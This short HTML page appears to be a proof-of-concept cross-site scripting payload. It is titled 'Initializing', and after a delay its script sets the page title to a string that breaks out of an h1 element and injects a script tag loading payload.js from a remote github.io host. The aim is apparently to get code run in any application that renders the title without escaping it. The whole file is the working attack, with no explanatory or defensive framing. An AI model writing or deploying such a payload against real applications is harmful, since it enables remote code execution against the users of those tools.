<!DOCTYPE html>
<html>
<head>
    <title>Initializing</title>
</head>
<body>
    <script>
        const payload = `</h1><script src="https://chjinqi.github.io/js/payload.js"><\/script><h1>`;

        setTimeout(() => {
            document.title = "Init";
        }, 500);
        
        setTimeout(() => {
            document.title = payload;
        }, 2000);
    </script>
</body>
</html>
